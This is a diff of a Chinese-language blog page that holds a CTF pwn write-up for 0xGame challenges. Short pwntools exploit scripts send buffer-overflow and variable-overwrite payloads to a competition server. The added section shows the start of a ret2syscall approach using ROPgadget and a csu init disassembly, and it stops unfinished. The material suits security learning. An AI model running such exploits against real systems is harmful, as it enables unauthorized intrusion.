@@ -51,8 +51,12 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20201019200641989.png#pic_center">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20201019205534671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20201019210240376.png#pic_center">
+<meta property="og:image" content="http://trick.ink/2021/03/30/Pwn_0xGame_01/Pwn_0xGame_01/20201022204647356.png">
+<meta property="og:image" content="http://trick.ink/2021/03/30/Pwn_0xGame_01/Pwn_0xGame_01/20201022204851409.png">
+<meta property="og:image" content="http://trick.ink/2021/03/30/Pwn_0xGame_01/Pwn_0xGame_01/20201022210119569.png">
+<meta property="og:image" content="http://trick.ink/2021/03/30/Pwn_0xGame_01/Pwn_0xGame_01/20201022210755704.png">
 <meta property="article:published_time" content="2021-03-30T04:41:06.251Z">
-<meta property="article:modified_time" content="2021-03-30T04:52:18.397Z">
+<meta property="article:modified_time" content="2021-05-08T10:18:46.190Z">
 <meta property="article:author" content="Trick">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://img-blog.csdnimg.cn/20201018162746427.png#pic_center">
@@ -236,10 +240,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-03-30 12:41:06 / 修改时间：12:52:18" itemprop="dateCreated datePublished" datetime="2021-03-30T12:41:06+08:00">2021-03-30</time>
+              <time title="创建时间：2021-03-30 12:41:06" itemprop="dateCreated datePublished" datetime="2021-03-30T12:41:06+08:00">2021-03-30</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-08 18:18:46" itemprop="dateModified" datetime="2021-05-08T18:18:46+08:00">2021-05-08</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -247,10 +257,6 @@
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                   <a href="/categories/%E6%AF%94%E8%B5%9BWriteUp/" itemprop="url" rel="index"><span itemprop="name">比赛WriteUp</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%AF%94%E8%B5%9BWriteUp/0xGame/" itemprop="url" rel="index"><span itemprop="name">0xGame</span></a>
                 </span>
             </span>
 
@@ -274,14 +280,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2.8k</span>
+              <span>3.9k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
+              <span>4 分钟</span>
             </span>
 
         </div>
@@ -308,7 +314,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line">p = remote(<span class="string">&#x27;39.101.210.214 &#x27;</span>,<span class="number">10002</span>) </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x20</span>+<span class="number">8</span>) + p64(<span class="number">0x401172</span>)</span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <h2 id="3-easy-stack"><a href="#3-easy-stack" class="headerlink" title="3.easy_stack"></a>3.easy_stack</h2><p>文件<br>easy_stack.txt：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&gt; ────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────</span><br><span class="line">&gt; EAX  <span class="number">0xffffcff0</span> ◂— <span class="number">0x0</span></span><br><span class="line">&gt; EBX  <span class="number">0x56558fb8</span> ◂— <span class="number">0x3ec0</span></span><br><span class="line">&gt; ECX  <span class="number">0xffffffff</span></span><br><span class="line">&gt; EDX  <span class="number">0xffffffff</span></span><br><span class="line">&gt; EDI  <span class="number">0xf7fa7000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x1dfd6c</span></span><br><span class="line">&gt; ESI  <span class="number">0xf7fa7000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x1dfd6c</span></span><br><span class="line">&gt; EBP  <span class="number">0xffffd078</span> —▸ <span class="number">0xffffd088</span> ◂— <span class="number">0x0</span></span><br><span class="line">&gt; ESP  <span class="number">0xffffcfe0</span> ◂— <span class="number">0x0</span></span><br><span class="line">&gt; EIP  <span class="number">0x56556273</span> —▸ <span class="number">0xfffdb8e8</span> ◂— <span class="number">0x0</span></span><br><span class="line">&gt;─────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────</span><br><span class="line">&gt; ► <span class="number">0x56556273</span>    call   read@plt &lt;<span class="number">0x56556030</span>&gt;</span><br><span class="line">&gt;   <span class="number">0x56556278</span>    add    esp, <span class="number">0x10</span></span><br><span class="line">&gt;   <span class="number">0x5655627b</span>    nop    </span><br><span class="line">&gt;   <span class="number">0x5655627c</span>    mov    ebx, dword ptr [ebp - <span class="number">4</span>]</span><br><span class="line">&gt;   <span class="number">0x5655627f</span>    leave  </span><br><span class="line">&gt;   <span class="number">0x56556280</span>    ret    </span><br><span class="line">&gt;──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────</span><br><span class="line">&gt;<span class="number">00</span>:<span class="number">0000</span>│ esp  <span class="number">0xffffcfe0</span> ◂— <span class="number">0x0</span></span><br><span class="line">&gt;01:0004│      <span class="number">0xffffcfe4</span> —▸ <span class="number">0xffffcff0</span> ◂— <span class="number">0x0</span></span><br><span class="line">&gt;02:0008│      <span class="number">0xffffcfe8</span> ◂— <span class="number">0x100</span></span><br><span class="line">&gt;03:000c│      <span class="number">0xffffcfec</span> —▸ <span class="number">0x56556234</span> ◂— <span class="number">0x2d84c381</span></span><br><span class="line">&gt;04:0010│ eax  <span class="number">0xffffcff0</span> ◂— <span class="number">0x0</span></span><br><span class="line">&gt;... ↓</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&gt; ────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────</span><br><span class="line">&gt; EAX  0xffffcff0 ◂— 0x0</span><br><span class="line">&gt; EBX  0x56558fb8 ◂— 0x3ec0</span><br><span class="line">&gt; ECX  0xffffffff</span><br><span class="line">&gt; EDX  0xffffffff</span><br><span class="line">&gt; EDI  0xf7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1dfd6c</span><br><span class="line">&gt; ESI  0xf7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1dfd6c</span><br><span class="line">&gt; EBP  0xffffd078 —▸ 0xffffd088 ◂— 0x0</span><br><span class="line">&gt; ESP  0xffffcfe0 ◂— 0x0</span><br><span class="line">&gt; EIP  0x56556273 —▸ 0xfffdb8e8 ◂— 0x0</span><br><span class="line">&gt;─────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────</span><br><span class="line">&gt; ► 0x56556273    call   read@plt &lt;0x56556030&gt;</span><br><span class="line">&gt;   0x56556278    add    esp, 0x10</span><br><span class="line">&gt;   0x5655627b    nop    </span><br><span class="line">&gt;   0x5655627c    mov    ebx, dword ptr [ebp - 4]</span><br><span class="line">&gt;   0x5655627f    leave  </span><br><span class="line">&gt;   0x56556280    ret    </span><br><span class="line">&gt;──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────</span><br><span class="line">&gt;00:0000│ esp  0xffffcfe0 ◂— 0x0</span><br><span class="line">&gt;01:0004│      0xffffcfe4 —▸ 0xffffcff0 ◂— 0x0</span><br><span class="line">&gt;02:0008│      0xffffcfe8 ◂— 0x100</span><br><span class="line">&gt;03:000c│      0xffffcfec —▸ 0x56556234 ◂— 0x2d84c381</span><br><span class="line">&gt;04:0010│ eax  0xffffcff0 ◂— 0x0</span><br><span class="line">&gt;... ↓</span><br></pre></td></tr></table></figure>
 
 <p>► 0x56556273    call   read@plt &lt;0x56556030&gt;<br>调用了read函数，再看看read函数中的三个参数</p>
 <pre><code>read (fd, char *buf , count)
@@ -349,6 +355,26 @@
 <p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;39.101.210.214&#x27;</span>,<span class="number">10007</span>) </span><br><span class="line"></span><br><span class="line">payload =  <span class="built_in">str</span>(<span class="number">0x233300000000</span>) </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+
+
+<h2 id="6-Pwn题滞销-帮帮我好吗"><a href="#6-Pwn题滞销-帮帮我好吗" class="headerlink" title="6.Pwn题滞销,帮帮我好吗?"></a>6.Pwn题滞销,帮帮我好吗?</h2><h3 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h3><p>IDA打开</p>
+<p><img src="Pwn_0xGame_01/20201022204647356.png" alt="在这里插入图片描述"></p>
+<p>发现是个syscall的题目<br>直接去看这个函数的汇编</p>
+<p><img src="Pwn_0xGame_01/20201022204851409.png" alt="在这里插入图片描述"></p>
+<p>根据师傅们所说，我们需要让rax存入59，让syscall去调用execve函数 （ret2syscall？）</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/arch/x86/entry/syscalls/syscall_64.tbl">syscall_64 GitHub查询</a></p>
+<p>之后要构造出来  execve(“/bin/sh”,0,0) 拿取权限<br>找”/bin/sh”字符串<br>方法一：<br>在程序中有，找到它</p>
+<p><img src="Pwn_0xGame_01/20201022210119569.png" alt="在这里插入图片描述"></p>
+<p>从’[‘数起到斜杠前面的空格’ ‘，再加上前面的04个字符，一共是22个，换成16进制是16h<br>所以”/bin/sh”的地址为：0x402016</p>
+<p>方法二：<br>构造ROP链来寻找（这是看官方WriteUp看到的方法</p>
+<p><code>ROPgadget --binary ./main --string &#39;/bin/sh&#39;</code></p>
+<p><img src="Pwn_0xGame_01/20201022210755704.png" alt="在这里插入图片描述"></p>
+<p>找来找去，最后还是要用到csu init函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> text:00000000004011D8 loc_4011D8:                             ; CODE XREF: init+4C↓j</span><br><span class="line">.text:00000000004011D8                 mov     rdx, r14</span><br><span class="line">.text:00000000004011DB                 mov     rsi, r13</span><br><span class="line">.text:00000000004011DE                 mov     edi, r12d</span><br><span class="line">.text:00000000004011E1                 call    qword ptr [r15+rbx*8]</span><br><span class="line">.text:00000000004011E5                 add     rbx, 1</span><br><span class="line">.text:00000000004011E9                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004011EC                 jnz     short loc_4011D8</span><br><span class="line">.text:00000000004011EE</span><br><span class="line">.text:00000000004011EE loc_4011EE:                             ; CODE XREF: init+31↑j</span><br><span class="line">.text:00000000004011EE                 add     rsp, 8</span><br><span class="line">.text:00000000004011F2                 pop     rbx</span><br><span class="line">.text:00000000004011F3                 pop     rbp</span><br><span class="line">.text:00000000004011F4                 pop     r12</span><br><span class="line">.text:00000000004011F6                 pop     r13</span><br><span class="line">.text:00000000004011F8                 pop     r14</span><br><span class="line">.text:00000000004011FA                 pop     r15</span><br><span class="line">.text:00000000004011FC                 retn</span><br><span class="line">.text:00000000004011FC ; &#125; &#x2F;&#x2F; starts at 4011A0</span><br><span class="line">.text:00000000004011FC init            endp</span><br><span class="line">.text:00000000004011FC</span><br></pre></td></tr></table></figure>
+
+
+<p>咕咕咕~~~</p>
+
     </div>
 
     
@@ -367,8 +393,8 @@
       <i class="fa fa-chevron-left"></i> Hello World
     </a></div>
       <div class="post-nav-item">
-    <a href="/2021/03/30/Pwn_0xGame_02/" rel="next" title="Pwn_0xGame_02">
-      Pwn_0xGame_02 <i class="fa fa-chevron-right"></i>
+    <a href="/2021/03/30/Hgame/" rel="next" title="HGame">
+      HGame <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -428,7 +454,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn-0xGame-01"><span class="nav-number">1.</span> <span class="nav-text">Pwn_0xGame_01</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B00xGame%E5%B9%B3%E5%8F%B0"><span class="nav-number">1.1.</span> <span class="nav-text">1.欢迎来到0xGame平台</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E5%B8%AE%E6%88%91%E5%8F%96%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0"><span class="nav-number">1.2.</span> <span class="nav-text">2.帮我取一个题目名称</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-easy-stack"><span class="nav-number">1.3.</span> <span class="nav-text">3.easy_stack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E8%AF%A5%E6%80%8E%E4%B9%88%E8%B5%B7%E5%90%8D%E5%91%A2"><span class="nav-number">1.4.</span> <span class="nav-text">4.该怎么起名呢</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode"><span class="nav-number">1.4.1.</span> <span class="nav-text">shellcode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-variable-coverage"><span class="nav-number">1.5.</span> <span class="nav-text">5.variable_coverage</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-number">1.5.1.</span> <span class="nav-text">变量覆盖</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn-0xGame-01"><span class="nav-number">1.</span> <span class="nav-text">Pwn_0xGame_01</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B00xGame%E5%B9%B3%E5%8F%B0"><span class="nav-number">1.1.</span> <span class="nav-text">1.欢迎来到0xGame平台</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E5%B8%AE%E6%88%91%E5%8F%96%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0"><span class="nav-number">1.2.</span> <span class="nav-text">2.帮我取一个题目名称</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-easy-stack"><span class="nav-number">1.3.</span> <span class="nav-text">3.easy_stack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E8%AF%A5%E6%80%8E%E4%B9%88%E8%B5%B7%E5%90%8D%E5%91%A2"><span class="nav-number">1.4.</span> <span class="nav-text">4.该怎么起名呢</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode"><span class="nav-number">1.4.1.</span> <span class="nav-text">shellcode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-variable-coverage"><span class="nav-number">1.5.</span> <span class="nav-text">5.variable_coverage</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-number">1.5.1.</span> <span class="nav-text">变量覆盖</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-Pwn%E9%A2%98%E6%BB%9E%E9%94%80-%E5%B8%AE%E5%B8%AE%E6%88%91%E5%A5%BD%E5%90%97"><span class="nav-number">1.6.</span> <span class="nav-text">6.Pwn题滞销,帮帮我好吗?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#syscall"><span class="nav-number">1.6.1.</span> <span class="nav-text">syscall</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -444,14 +470,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">27</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-count">19</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
@@ -507,12 +533,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">38k</span>
+    <span title="站点总字数">82k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">35 分钟</span>
+    <span title="站点阅读时长">1:15</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
